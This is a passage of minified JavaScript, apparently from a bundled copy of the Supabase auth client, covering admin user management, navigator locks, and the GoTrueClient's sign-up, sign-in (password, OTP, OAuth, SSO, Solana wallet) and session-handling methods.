                            (r = (n = e == null ? void 0 : e.page) === null || n === void 0 ? void 0 : n.toString()) !==
                                null && r !== void 0
                                ? r
                                : "",
                        per_page:
                            (i =
                                (s = e == null ? void 0 : e.perPage) === null || s === void 0
                                    ? void 0
                                    : s.toString()) !== null && i !== void 0
                                ? i
                                : "",
                    },
                    xform: Kx,
                });
            if (d.error) throw d.error;
            const h = await d.json(),
                f = (o = d.headers.get("x-total-count")) !== null && o !== void 0 ? o : 0,
                v =
                    (l = (a = d.headers.get("link")) === null || a === void 0 ? void 0 : a.split(",")) !== null &&
                    l !== void 0
                        ? l
                        : [];
            return (
                v.length > 0 &&
                    (v.forEach((y) => {
                        const _ = parseInt(y.split(";")[0].split("=")[1].substring(0, 1)),
                            b = JSON.parse(y.split(";")[1].split("=")[1]);
                        c[`${b}Page`] = _;
                    }),
                    (c.total = parseInt(f))),
                { data: Object.assign(Object.assign({}, h), c), error: null }
            );
        } catch (c) {
            if (O(c)) return { data: { users: [] }, error: c };
            throw c;
        }
    }
    async getUserById(e) {
        In(e);
        try {
            return await A(this.fetch, "GET", `${this.url}/admin/users/${e}`, { headers: this.headers, xform: Ut });
        } catch (n) {
            if (O(n)) return { data: { user: null }, error: n };
            throw n;
        }
    }
    async updateUserById(e, n) {
        In(e);
        try {
            return await A(this.fetch, "PUT", `${this.url}/admin/users/${e}`, {
                body: n,
                headers: this.headers,
                xform: Ut,
            });
        } catch (r) {
            if (O(r)) return { data: { user: null }, error: r };
            throw r;
        }
    }
    async deleteUser(e, n = !1) {
        In(e);
        try {
            return await A(this.fetch, "DELETE", `${this.url}/admin/users/${e}`, {
                headers: this.headers,
                body: { should_soft_delete: n },
                xform: Ut,
            });
        } catch (r) {
            if (O(r)) return { data: { user: null }, error: r };
            throw r;
        }
    }
    async _listFactors(e) {
        In(e.userId);
        try {
            const { data: n, error: r } = await A(this.fetch, "GET", `${this.url}/admin/users/${e.userId}/factors`, {
                headers: this.headers,
                xform: (s) => ({ data: { factors: s }, error: null }),
            });
            return { data: n, error: r };
        } catch (n) {
            if (O(n)) return { data: null, error: n };
            throw n;
        }
    }
    async _deleteFactor(e) {
        In(e.userId), In(e.id);
        try {
            return {
                data: await A(this.fetch, "DELETE", `${this.url}/admin/users/${e.userId}/factors/${e.id}`, {
                    headers: this.headers,
                }),
                error: null,
            };
        } catch (n) {
            if (O(n)) return { data: null, error: n };
            throw n;
        }
    }
}
function ed(t = {}) {
    return {
        getItem: (e) => t[e] || null,
        setItem: (e, n) => {
            t[e] = n;
        },
        removeItem: (e) => {
            delete t[e];
        },
    };
}
function Yx() {
    if (typeof globalThis != "object")
        try {
            Object.defineProperty(Object.prototype, "__magic__", {
                get: function () {
                    return this;
                },
                configurable: !0,
            }),
                (__magic__.globalThis = __magic__),
                delete Object.prototype.__magic__;
        } catch {
            typeof self < "u" && (self.globalThis = self);
        }
}
const An = {
    debug: !!(
        globalThis &&
        Zf() &&
        globalThis.localStorage &&
        globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug") === "true"
    ),
};
class tp extends Error {
    constructor(e) {
        super(e), (this.isAcquireTimeout = !0);
    }
}
class Zx extends tp {}
async function ew(t, e, n) {
    An.debug && console.log("@supabase/gotrue-js: navigatorLock: acquire lock", t, e);
    const r = new globalThis.AbortController();
    return (
        e > 0 &&
            setTimeout(() => {
                r.abort(), An.debug && console.log("@supabase/gotrue-js: navigatorLock acquire timed out", t);
            }, e),
        await Promise.resolve().then(() =>
            globalThis.navigator.locks.request(
                t,
                e === 0 ? { mode: "exclusive", ifAvailable: !0 } : { mode: "exclusive", signal: r.signal },
                async (s) => {
                    if (s) {
                        An.debug && console.log("@supabase/gotrue-js: navigatorLock: acquired", t, s.name);
                        try {
                            return await n();
                        } finally {
                            An.debug && console.log("@supabase/gotrue-js: navigatorLock: released", t, s.name);
                        }
                    } else {
                        if (e === 0)
                            throw (
                                (An.debug &&
                                    console.log("@supabase/gotrue-js: navigatorLock: not immediately available", t),
                                new Zx(`Acquiring an exclusive Navigator LockManager lock "${t}" immediately failed`))
                            );
                        if (An.debug)
                            try {
                                const i = await globalThis.navigator.locks.query();
                                console.log(
                                    "@supabase/gotrue-js: Navigator LockManager state",
                                    JSON.stringify(i, null, "  ")
                                );
                            } catch (i) {
                                console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state", i);
                            }
                        return (
                            console.warn(
                                "@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"
                            ),
                            await n()
                        );
                    }
                }
            )
        )
    );
}
Yx();
const tw = {
    url: dx,
    storageKey: hx,
    autoRefreshToken: !0,
    persistSession: !0,
    detectSessionInUrl: !0,
    headers: fx,
    flowType: "implicit",
    debug: !1,
    hasCustomAuthorizationHeader: !1,
};
async function td(t, e, n) {
    return await n();
}
const Ln = {};
class ps {
    constructor(e) {
        var n, r;
        (this.userStorage = null),
            (this.memoryStorage = null),
            (this.stateChangeEmitters = new Map()),
            (this.autoRefreshTicker = null),
            (this.visibilityChangedCallback = null),
            (this.refreshingDeferred = null),
            (this.initializePromise = null),
            (this.detectSessionInUrl = !0),
            (this.hasCustomAuthorizationHeader = !1),
            (this.suppressGetSessionWarning = !1),
            (this.lockAcquired = !1),
            (this.pendingInLock = []),
            (this.broadcastChannel = null),
            (this.logger = console.log),
            (this.instanceID = ps.nextInstanceID),
            (ps.nextInstanceID += 1),
            this.instanceID > 0 &&
                Xe() &&
                console.warn(
                    "Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key."
                );
        const s = Object.assign(Object.assign({}, tw), e);
        if (
            ((this.logDebugMessages = !!s.debug),
            typeof s.debug == "function" && (this.logger = s.debug),
            (this.persistSession = s.persistSession),
            (this.storageKey = s.storageKey),
            (this.autoRefreshToken = s.autoRefreshToken),
            (this.admin = new Xx({ url: s.url, headers: s.headers, fetch: s.fetch })),
            (this.url = s.url),
            (this.headers = s.headers),
            (this.fetch = ep(s.fetch)),
            (this.lock = s.lock || td),
            (this.detectSessionInUrl = s.detectSessionInUrl),
            (this.flowType = s.flowType),
            (this.hasCustomAuthorizationHeader = s.hasCustomAuthorizationHeader),
            s.lock
                ? (this.lock = s.lock)
                : Xe() &&
                    !((n = globalThis == null ? void 0 : globalThis.navigator) === null || n === void 0) &&
                    n.locks
                  ? (this.lock = ew)
                  : (this.lock = td),
            this.jwks || ((this.jwks = { keys: [] }), (this.jwks_cached_at = Number.MIN_SAFE_INTEGER)),
            (this.mfa = {
                verify: this._verify.bind(this),
                enroll: this._enroll.bind(this),
                unenroll: this._unenroll.bind(this),
                challenge: this._challenge.bind(this),
                listFactors: this._listFactors.bind(this),
                challengeAndVerify: this._challengeAndVerify.bind(this),
                getAuthenticatorAssuranceLevel: this._getAuthenticatorAssuranceLevel.bind(this),
            }),
            this.persistSession
                ? (s.storage
                      ? (this.storage = s.storage)
                      : Zf()
                        ? (this.storage = globalThis.localStorage)
                        : ((this.memoryStorage = {}), (this.storage = ed(this.memoryStorage))),
                  s.userStorage && (this.userStorage = s.userStorage))
                : ((this.memoryStorage = {}), (this.storage = ed(this.memoryStorage))),
            Xe() && globalThis.BroadcastChannel && this.persistSession && this.storageKey)
        ) {
            try {
                this.broadcastChannel = new globalThis.BroadcastChannel(this.storageKey);
            } catch (i) {
                console.error(
                    "Failed to create a new BroadcastChannel, multi-tab state changes will not be available",
                    i
                );
            }
            (r = this.broadcastChannel) === null ||
                r === void 0 ||
                r.addEventListener("message", async (i) => {
                    this._debug("received broadcast notification from other tab or client", i),
                        await this._notifyAllSubscribers(i.data.event, i.data.session, !1);
                });
        }
        this.initialize();
    }
    get jwks() {
        var e, n;
        return (n = (e = Ln[this.storageKey]) === null || e === void 0 ? void 0 : e.jwks) !== null && n !== void 0
            ? n
            : { keys: [] };
    }
    set jwks(e) {
        Ln[this.storageKey] = Object.assign(Object.assign({}, Ln[this.storageKey]), { jwks: e });
    }
    get jwks_cached_at() {
        var e, n;
        return (n = (e = Ln[this.storageKey]) === null || e === void 0 ? void 0 : e.cachedAt) !== null && n !== void 0
            ? n
            : Number.MIN_SAFE_INTEGER;
    }
    set jwks_cached_at(e) {
        Ln[this.storageKey] = Object.assign(Object.assign({}, Ln[this.storageKey]), { cachedAt: e });
    }
    _debug(...e) {
        return (
            this.logDebugMessages &&
                this.logger(`GoTrueClient@${this.instanceID} (${Qf}) ${new Date().toISOString()}`, ...e),
            this
        );
    }
    async initialize() {
        return this.initializePromise
            ? await this.initializePromise
            : ((this.initializePromise = (async () =>
                  await this._acquireLock(-1, async () => await this._initialize()))()),
              await this.initializePromise);
    }
    async _initialize() {
        var e;
        try {
            const n = Px(window.location.href);
            let r = "none";
            if (
                (this._isImplicitGrantCallback(n) ? (r = "implicit") : (await this._isPKCECallback(n)) && (r = "pkce"),
                Xe() && this.detectSessionInUrl && r !== "none")
            ) {
                const { data: s, error: i } = await this._getSessionFromURL(n, r);
                if (i) {
                    if ((this._debug("#_initialize()", "error detecting session from URL", i), xx(i))) {
                        const l = (e = i.details) === null || e === void 0 ? void 0 : e.code;
                        if (
                            l === "identity_already_exists" ||
                            l === "identity_not_found" ||
                            l === "single_identity_not_deletable"
                        )
                            return { error: i };
                    }
                    return await this._removeSession(), { error: i };
                }
                const { session: o, redirectType: a } = s;
                return (
                    this._debug("#_initialize()", "detected session in URL", o, "redirect type", a),
                    await this._saveSession(o),
                    setTimeout(async () => {
                        a === "recovery"
                            ? await this._notifyAllSubscribers("PASSWORD_RECOVERY", o)
                            : await this._notifyAllSubscribers("SIGNED_IN", o);
                    }, 0),
                    { error: null }
                );
            }
            return await this._recoverAndRefresh(), { error: null };
        } catch (n) {
            return O(n) ? { error: n } : { error: new Xf("Unexpected error during initialization", n) };
        } finally {
            await this._handleVisibilityChange(), this._debug("#_initialize()", "end");
        }
    }
    async signInAnonymously(e) {
        var n, r, s;
        try {
            const i = await A(this.fetch, "POST", `${this.url}/signup`, {
                    headers: this.headers,
                    body: {
                        data:
                            (r = (n = e == null ? void 0 : e.options) === null || n === void 0 ? void 0 : n.data) !==
                                null && r !== void 0
                                ? r
                                : {},
                        gotrue_meta_security: {
                            captcha_token:
                                (s = e == null ? void 0 : e.options) === null || s === void 0 ? void 0 : s.captchaToken,
                        },
                    },
                    xform: mt,
                }),
                { data: o, error: a } = i;
            if (a || !o) return { data: { user: null, session: null }, error: a };
            const l = o.session,
                c = o.user;
            return (
                o.session && (await this._saveSession(o.session), await this._notifyAllSubscribers("SIGNED_IN", l)),
                { data: { user: c, session: l }, error: null }
            );
        } catch (i) {
            if (O(i)) return { data: { user: null, session: null }, error: i };
            throw i;
        }
    }
    async signUp(e) {
        var n, r, s;
        try {
            let i;
            if ("email" in e) {
                const { email: d, password: h, options: f } = e;
                let v = null,
                    y = null;
                this.flowType === "pkce" && ([v, y] = await $n(this.storage, this.storageKey)),
                    (i = await A(this.fetch, "POST", `${this.url}/signup`, {
                        headers: this.headers,
                        redirectTo: f == null ? void 0 : f.emailRedirectTo,
                        body: {
                            email: d,
                            password: h,
                            data: (n = f == null ? void 0 : f.data) !== null && n !== void 0 ? n : {},
                            gotrue_meta_security: { captcha_token: f == null ? void 0 : f.captchaToken },
                            code_challenge: v,
                            code_challenge_method: y,
                        },
                        xform: mt,
                    }));
            } else if ("phone" in e) {
                const { phone: d, password: h, options: f } = e;
                i = await A(this.fetch, "POST", `${this.url}/signup`, {
                    headers: this.headers,
                    body: {
                        phone: d,
                        password: h,
                        data: (r = f == null ? void 0 : f.data) !== null && r !== void 0 ? r : {},
                        channel: (s = f == null ? void 0 : f.channel) !== null && s !== void 0 ? s : "sms",
                        gotrue_meta_security: { captcha_token: f == null ? void 0 : f.captchaToken },
                    },
                    xform: mt,
                });
            } else throw new Gs("You must provide either an email or phone number and a password");
            const { data: o, error: a } = i;
            if (a || !o) return { data: { user: null, session: null }, error: a };
            const l = o.session,
                c = o.user;
            return (
                o.session && (await this._saveSession(o.session), await this._notifyAllSubscribers("SIGNED_IN", l)),
                { data: { user: c, session: l }, error: null }
            );
        } catch (i) {
            if (O(i)) return { data: { user: null, session: null }, error: i };
            throw i;
        }
    }
    async signInWithPassword(e) {
        try {
            let n;
            if ("email" in e) {
                const { email: i, password: o, options: a } = e;
                n = await A(this.fetch, "POST", `${this.url}/token?grant_type=password`, {
                    headers: this.headers,
                    body: {
                        email: i,
                        password: o,
                        gotrue_meta_security: { captcha_token: a == null ? void 0 : a.captchaToken },
                    },
                    xform: Zc,
                });
            } else if ("phone" in e) {
                const { phone: i, password: o, options: a } = e;
                n = await A(this.fetch, "POST", `${this.url}/token?grant_type=password`, {
                    headers: this.headers,
                    body: {
                        phone: i,
                        password: o,
                        gotrue_meta_security: { captcha_token: a == null ? void 0 : a.captchaToken },
                    },
                    xform: Zc,
                });
            } else throw new Gs("You must provide either an email or phone number and a password");
            const { data: r, error: s } = n;
            return s
                ? { data: { user: null, session: null }, error: s }
                : !r || !r.session || !r.user
                  ? { data: { user: null, session: null }, error: new qs() }
                  : (r.session &&
                        (await this._saveSession(r.session), await this._notifyAllSubscribers("SIGNED_IN", r.session)),
                    {
                        data: Object.assign(
                            { user: r.user, session: r.session },
                            r.weak_password ? { weakPassword: r.weak_password } : null
                        ),
                        error: s,
                    });
        } catch (n) {
            if (O(n)) return { data: { user: null, session: null }, error: n };
            throw n;
        }
    }
    async signInWithOAuth(e) {
        var n, r, s, i;
        return await this._handleProviderSignIn(e.provider, {
            redirectTo: (n = e.options) === null || n === void 0 ? void 0 : n.redirectTo,
            scopes: (r = e.options) === null || r === void 0 ? void 0 : r.scopes,
            queryParams: (s = e.options) === null || s === void 0 ? void 0 : s.queryParams,
            skipBrowserRedirect: (i = e.options) === null || i === void 0 ? void 0 : i.skipBrowserRedirect,
        });
    }
    async exchangeCodeForSession(e) {
        return await this.initializePromise, this._acquireLock(-1, async () => this._exchangeCodeForSession(e));
    }
    async signInWithWeb3(e) {
        const { chain: n } = e;
        if (n === "solana") return await this.signInWithSolana(e);
        throw new Error(`@supabase/auth-js: Unsupported chain "${n}"`);
    }
    async signInWithSolana(e) {
        var n, r, s, i, o, a, l, c, d, h, f, v;
        let y, _;
        if ("message" in e) (y = e.message), (_ = e.signature);
        else {
            const { chain: b, wallet: g, statement: p, options: m } = e;
            let w;
            if (Xe())
                if (typeof g == "object") w = g;
                else {
                    const j = window;
                    if (
                        "solana" in j &&
                        typeof j.solana == "object" &&
                        (("signIn" in j.solana && typeof j.solana.signIn == "function") ||
                            ("signMessage" in j.solana && typeof j.solana.signMessage == "function"))
                    )
                        w = j.solana;
                    else
                        throw new Error(
                            "@supabase/auth-js: No compatible Solana wallet interface on the window object (window.solana) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'solana', wallet: resolvedUserWallet }) instead."
                        );
                }
            else {
                if (typeof g != "object" || !(m != null && m.url))
                    throw new Error(
                        "@supabase/auth-js: Both wallet and url must be specified in non-browser environments."
                    );
                w = g;
            }
            const k = new URL((n = m == null ? void 0 : m.url) !== null && n !== void 0 ? n : window.location.href);
            if ("signIn" in w && w.signIn) {
                const j = await w.signIn(
                    Object.assign(
                        Object.assign(
                            Object.assign(
                                { issuedAt: new Date().toISOString() },
                                m == null ? void 0 : m.signInWithSolana
                            ),
                            { version: "1", domain: k.host, uri: k.href }
                        ),
                        p ? { statement: p } : null
                    )
                );
                let N;
                if (Array.isArray(j) && j[0] && typeof j[0] == "object") N = j[0];
                else if (j && typeof j == "object" && "signedMessage" in j && "signature" in j) N = j;
                else throw new Error("@supabase/auth-js: Wallet method signIn() returned unrecognized value");
                if (
                    "signedMessage" in N &&
                    "signature" in N &&
                    (typeof N.signedMessage == "string" || N.signedMessage instanceof Uint8Array) &&
                    N.signature instanceof Uint8Array
                )
                    (y =
                        typeof N.signedMessage == "string"
                            ? N.signedMessage
                            : new TextDecoder().decode(N.signedMessage)),
                        (_ = N.signature);
                else
                    throw new Error(
                        "@supabase/auth-js: Wallet method signIn() API returned object without signedMessage and signature fields"
                    );
            } else {
                if (
                    !("signMessage" in w) ||
                    typeof w.signMessage != "function" ||
                    !("publicKey" in w) ||
                    typeof w != "object" ||
                    !w.publicKey ||
                    !("toBase58" in w.publicKey) ||
                    typeof w.publicKey.toBase58 != "function"
                )
                    throw new Error(
                        "@supabase/auth-js: Wallet does not have a compatible signMessage() and publicKey.toBase58() API"
                    );
                y = [
                    `${k.host} wants you to sign in with your Solana account:`,
                    w.publicKey.toBase58(),
                    ...(p ? ["", p, ""] : [""]),
                    "Version: 1",
                    `URI: ${k.href}`,
                    `Issued At: ${(s = (r = m == null ? void 0 : m.signInWithSolana) === null || r === void 0 ? void 0 : r.issuedAt) !== null && s !== void 0 ? s : new Date().toISOString()}`,
                    ...(!((i = m == null ? void 0 : m.signInWithSolana) === null || i === void 0) && i.notBefore
                        ? [`Not Before: ${m.signInWithSolana.notBefore}`]
                        : []),
                    ...(!((o = m == null ? void 0 : m.signInWithSolana) === null || o === void 0) && o.expirationTime
                        ? [`Expiration Time: ${m.signInWithSolana.expirationTime}`]
                        : []),
                    ...(!((a = m == null ? void 0 : m.signInWithSolana) === null || a === void 0) && a.chainId
                        ? [`Chain ID: ${m.signInWithSolana.chainId}`]
                        : []),
                    ...(!((l = m == null ? void 0 : m.signInWithSolana) === null || l === void 0) && l.nonce
                        ? [`Nonce: ${m.signInWithSolana.nonce}`]
                        : []),
                    ...(!((c = m == null ? void 0 : m.signInWithSolana) === null || c === void 0) && c.requestId
                        ? [`Request ID: ${m.signInWithSolana.requestId}`]
                        : []),
                    ...(!(
                        (h =
                            (d = m == null ? void 0 : m.signInWithSolana) === null || d === void 0
                                ? void 0
                                : d.resources) === null || h === void 0
                    ) && h.length
                        ? ["Resources", ...m.signInWithSolana.resources.map((N) => `- ${N}`)]
                        : []),
                ].join(`
`);
                const j = await w.signMessage(new TextEncoder().encode(y), "utf8");
                if (!j || !(j instanceof Uint8Array))
                    throw new Error("@supabase/auth-js: Wallet signMessage() API returned an recognized value");
                _ = j;
            }
        }
        try {
            const { data: b, error: g } = await A(this.fetch, "POST", `${this.url}/token?grant_type=web3`, {
                headers: this.headers,
                body: Object.assign(
                    { chain: "solana", message: y, signature: Ex(_) },
                    !((f = e.options) === null || f === void 0) && f.captchaToken
                        ? {
                              gotrue_meta_security: {
                                  captcha_token: (v = e.options) === null || v === void 0 ? void 0 : v.captchaToken,
                              },
                          }
                        : null
                ),
                xform: mt,
            });
            if (g) throw g;
            return !b || !b.session || !b.user
                ? { data: { user: null, session: null }, error: new qs() }
                : (b.session &&
                      (await this._saveSession(b.session), await this._notifyAllSubscribers("SIGNED_IN", b.session)),
                  { data: Object.assign({}, b), error: g });
        } catch (b) {
            if (O(b)) return { data: { user: null, session: null }, error: b };
            throw b;
        }
    }
    async _exchangeCodeForSession(e) {
        const n = await an(this.storage, `${this.storageKey}-code-verifier`),
            [r, s] = (n ?? "").split("/");
        try {
            const { data: i, error: o } = await A(this.fetch, "POST", `${this.url}/token?grant_type=pkce`, {
                headers: this.headers,
                body: { auth_code: e, code_verifier: r },
                xform: mt,
            });
            if ((await Ot(this.storage, `${this.storageKey}-code-verifier`), o)) throw o;
            return !i || !i.session || !i.user
                ? { data: { user: null, session: null, redirectType: null }, error: new qs() }
                : (i.session &&
                      (await this._saveSession(i.session), await this._notifyAllSubscribers("SIGNED_IN", i.session)),
                  { data: Object.assign(Object.assign({}, i), { redirectType: s ?? null }), error: o });
        } catch (i) {
            if (O(i)) return { data: { user: null, session: null, redirectType: null }, error: i };
            throw i;
        }
    }
    async signInWithIdToken(e) {
        try {
            const { options: n, provider: r, token: s, access_token: i, nonce: o } = e,
                a = await A(this.fetch, "POST", `${this.url}/token?grant_type=id_token`, {
                    headers: this.headers,
                    body: {
                        provider: r,
                        id_token: s,
                        access_token: i,
                        nonce: o,
                        gotrue_meta_security: { captcha_token: n == null ? void 0 : n.captchaToken },
                    },
                    xform: mt,
                }),
                { data: l, error: c } = a;
            return c
                ? { data: { user: null, session: null }, error: c }
                : !l || !l.session || !l.user
                  ? { data: { user: null, session: null }, error: new qs() }
                  : (l.session &&
                        (await this._saveSession(l.session), await this._notifyAllSubscribers("SIGNED_IN", l.session)),
                    { data: l, error: c });
        } catch (n) {
            if (O(n)) return { data: { user: null, session: null }, error: n };
            throw n;
        }
    }
    async signInWithOtp(e) {
        var n, r, s, i, o;
        try {
            if ("email" in e) {
                const { email: a, options: l } = e;
                let c = null,
                    d = null;
                this.flowType === "pkce" && ([c, d] = await $n(this.storage, this.storageKey));
                const { error: h } = await A(this.fetch, "POST", `${this.url}/otp`, {
                    headers: this.headers,
                    body: {
                        email: a,
                        data: (n = l == null ? void 0 : l.data) !== null && n !== void 0 ? n : {},
                        create_user: (r = l == null ? void 0 : l.shouldCreateUser) !== null && r !== void 0 ? r : !0,
                        gotrue_meta_security: { captcha_token: l == null ? void 0 : l.captchaToken },
                        code_challenge: c,
                        code_challenge_method: d,
                    },
                    redirectTo: l == null ? void 0 : l.emailRedirectTo,
                });
                return { data: { user: null, session: null }, error: h };
            }
            if ("phone" in e) {
                const { phone: a, options: l } = e,
                    { data: c, error: d } = await A(this.fetch, "POST", `${this.url}/otp`, {
                        headers: this.headers,
                        body: {
                            phone: a,
                            data: (s = l == null ? void 0 : l.data) !== null && s !== void 0 ? s : {},
                            create_user:
                                (i = l == null ? void 0 : l.shouldCreateUser) !== null && i !== void 0 ? i : !0,
                            gotrue_meta_security: { captcha_token: l == null ? void 0 : l.captchaToken },
                            channel: (o = l == null ? void 0 : l.channel) !== null && o !== void 0 ? o : "sms",
                        },
                    });
                return { data: { user: null, session: null, messageId: c == null ? void 0 : c.message_id }, error: d };
            }
            throw new Gs("You must provide either an email or phone number.");
        } catch (a) {
            if (O(a)) return { data: { user: null, session: null }, error: a };
            throw a;
        }
    }
    async verifyOtp(e) {
        var n, r;
        try {
            let s, i;
            "options" in e &&
                ((s = (n = e.options) === null || n === void 0 ? void 0 : n.redirectTo),
                (i = (r = e.options) === null || r === void 0 ? void 0 : r.captchaToken));
            const { data: o, error: a } = await A(this.fetch, "POST", `${this.url}/verify`, {
                headers: this.headers,
                body: Object.assign(Object.assign({}, e), { gotrue_meta_security: { captcha_token: i } }),
                redirectTo: s,
                xform: mt,
            });
            if (a) throw a;
            if (!o) throw new Error("An error occurred on token verification.");
            const l = o.session,
                c = o.user;
            return (
                l != null &&
                    l.access_token &&
                    (await this._saveSession(l),
                    await this._notifyAllSubscribers(e.type == "recovery" ? "PASSWORD_RECOVERY" : "SIGNED_IN", l)),
                { data: { user: c, session: l }, error: null }
            );
        } catch (s) {
            if (O(s)) return { data: { user: null, session: null }, error: s };
            throw s;
        }
    }
    async signInWithSSO(e) {
        var n, r, s;
        try {
            let i = null,
                o = null;
            return (
                this.flowType === "pkce" && ([i, o] = await $n(this.storage, this.storageKey)),
                await A(this.fetch, "POST", `${this.url}/sso`, {
                    body: Object.assign(
                        Object.assign(
                            Object.assign(
                                Object.assign(
                                    Object.assign({}, "providerId" in e ? { provider_id: e.providerId } : null),
                                    "domain" in e ? { domain: e.domain } : null
                                ),
                                {
                                    redirect_to:
                                        (r = (n = e.options) === null || n === void 0 ? void 0 : n.redirectTo) !==
                                            null && r !== void 0
                                            ? r
                                            : void 0,
                                }
                            ),
                            !((s = e == null ? void 0 : e.options) === null || s === void 0) && s.captchaToken
                                ? { gotrue_meta_security: { captcha_token: e.options.captchaToken } }
                                : null
                        ),
                        { skip_http_redirect: !0, code_challenge: i, code_challenge_method: o }
                    ),
                    headers: this.headers,
                    xform: qx,
                })
            );
        } catch (i) {
            if (O(i)) return { data: null, error: i };
            throw i;
        }
    }
    async reauthenticate() {
        return await this.initializePromise, await this._acquireLock(-1, async () => await this._reauthenticate());
    }
    async _reauthenticate() {
        try {
            return await this._useSession(async (e) => {
                const {
                    data: { session: n },
                    error: r,
                } = e;
                if (r) throw r;
                if (!n) throw new $t();
                const { error: s } = await A(this.fetch, "GET", `${this.url}/reauthenticate`, {
                    headers: this.headers,
                    jwt: n.access_token,
                });
                return { data: { user: null, session: null }, error: s };
            });
        } catch (e) {
            if (O(e)) return { data: { user: null, session: null }, error: e };
            throw e;
        }
    }
    async resend(e) {
        try {
            const n = `${this.url}/resend`;
            if ("email" in e) {
                const { email: r, type: s, options: i } = e,
                    { error: o } = await A(this.fetch, "POST", n, {
                        headers: this.headers,
                        body: {
                            email: r,
                            type: s,
                            gotrue_meta_security: { captcha_token: i == null ? void 0 : i.captchaToken },
                        },
                        redirectTo: i == null ? void 0 : i.emailRedirectTo,
                    });
                return { data: { user: null, session: null }, error: o };
            } else if ("phone" in e) {
                const { phone: r, type: s, options: i } = e,
                    { data: o, error: a } = await A(this.fetch, "POST", n, {
                        headers: this.headers,
                        body: {
                            phone: r,
                            type: s,
                            gotrue_meta_security: { captcha_token: i == null ? void 0 : i.captchaToken },
                        },
                    });
                return { data: { user: null, session: null, messageId: o == null ? void 0 : o.message_id }, error: a };
            }
            throw new Gs("You must provide either an email or phone number and a type");
        } catch (n) {
            if (O(n)) return { data: { user: null, session: null }, error: n };
            throw n;
        }
    }
    async getSession() {
        return await this.initializePromise, await this._acquireLock(-1, async () => this._useSession(async (n) => n));
    }
    async _acquireLock(e, n) {
        this._debug("#_acquireLock", "begin", e);
        try {
            if (this.lockAcquired) {
                const r = this.pendingInLock.length
                        ? this.pendingInLock[this.pendingInLock.length - 1]
                        : Promise.resolve(),
                    s = (async () => (await r, await n()))();
                return (
                    this.pendingInLock.push(
                        (async () => {
                            try {
                                await s;
                            } catch {}
                        })()
                    ),
                    s
                );
            }
            return await this.lock(`lock:${this.storageKey}`, e, async () => {
                this._debug("#_acquireLock", "lock acquired for storage key", this.storageKey);
                try {
                    this.lockAcquired = !0;
                    const r = n();
                    for (
                        this.pendingInLock.push(
                            (async () => {
                                try {
                                    await r;
                                } catch {}
                            })()
                        ),
                            await r;
                        this.pendingInLock.length;

                    ) {
                        const s = [...this.pendingInLock];
                        await Promise.all(s), this.pendingInLock.splice(0, s.length);
                    }
                    return await r;
                } finally {
                    this._debug("#_acquireLock", "lock released for storage key", this.storageKey),
                        (this.lockAcquired = !1);
                }
            });
        } finally {
            this._debug("#_acquireLock", "end");
        }
    }
    async _useSession(e) {
        this._debug("#_useSession", "begin");
        try {
            const n = await this.__loadSession();
            return await e(n);
        } finally {
            this._debug("#_useSession", "end");
        }
    }
    async __loadSession() {
        this._debug("#__loadSession()", "begin"),
            this.lockAcquired ||
                this._debug("#__loadSession()", "used outside of an acquired lock!", new Error().stack);
        try {
            let e = null;
            const n = await an(this.storage, this.storageKey);
            if (
                (this._debug("#getSession()", "session from storage", n),
                n !== null &&
                    (this._isValidSession(n)
                        ? (e = n)
                        : (this._debug("#getSession()", "session from storage is not valid"),
                          await this._removeSession())),
                !e)
            )
                return { data: { session: null }, error: null };
            const r = e.expires_at ? e.expires_at * 1e3 - Date.now() < Xo : !1;
            if (
                (this._debug("#__loadSession()", `session has${r ? "" : " not"} expired`, "expires_at", e.expires_at),
                !r)
            ) {
                if (this.userStorage) {
                    const o = await an(this.userStorage, this.storageKey + "-user");
                    o != null && o.user ? (e.user = o.user) : (e.user = ea());
                }
                if (this.storage.isServer && e.user) {
                    let o = this.suppressGetSessionWarning;
                    e = new Proxy(e, {
                        get: (l, c, d) => (
                            !o &&
                                c === "user" &&
                                (console.warn(
                                    "Using the user object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (usually cookies on the server) and may not be authentic. Use supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server."
                                ),
                                (o = !0),
                                (this.suppressGetSessionWarning = !0)),
                            Reflect.get(l, c, d)
                        ),
                    });
                }
                return { data: { session: e }, error: null };
            }
            const { session: s, error: i } = await this._callRefreshToken(e.refresh_token);
            return i ? { data: { session: null }, error: i } : { data: { session: s }, error: null };
        } finally {
            this._debug("#__loadSession()", "end");
        }
    }
    async getUser(e) {
        return e
            ? await this._getUser(e)
            : (await this.initializePromise, await this._acquireLock(-1, async () => await this._getUser()));
    }
    async _getUser(e) {
        try {
            return e
                ? await A(this.fetch, "GET", `${this.url}/user`, { headers: this.headers, jwt: e, xform: Ut })
                : await this._useSession(async (n) => {
                      var r, s, i;
                      const { data: o, error: a } = n;
                      if (a) throw a;
                      return !(!((r = o.session) === null || r === void 0) && r.access_token) &&
                          !this.hasCustomAuthorizationHeader
                          ? { data: { user: null }, error: new $t() }
                          : await A(this.fetch, "GET", `${this.url}/user`, {
                                headers: this.headers,
                                jwt:
                                    (i = (s = o.session) === null || s === void 0 ? void 0 : s.access_token) !== null &&
                                    i !== void 0
                                        ? i
                                        : void 0,
                                xform: Ut,
                            });
                  });
        } catch (n) {
            if (O(n))
                return (
                    yx(n) && (await this._removeSession(), await Ot(this.storage, `${this.storageKey}-code-verifier`)),
                    { data: { user: null }, error: n }
                );
            throw n;
        }
    }
    async updateUser(e, n = {}) {
        return await this.initializePromise, await this._acquireLock(-1, async () => await this._updateUser(e, n));
    }
    async _updateUser(e, n = {}) {
        try {
            return await this._useSession(async (r) => {
                const { data: s, error: i } = r;
                if (i) throw i;
                if (!s.session) throw new $t();
                const o = s.session;
                let a = null,
                    l = null;
                this.flowType === "pkce" && e.email != null && ([a, l] = await $n(this.storage, this.storageKey));
                const { data: c, error: d } = await A(this.fetch, "PUT", `${this.url}/user`, {
                    headers: this.headers,
                    redirectTo: n == null ? void 0 : n.emailRedirectTo,
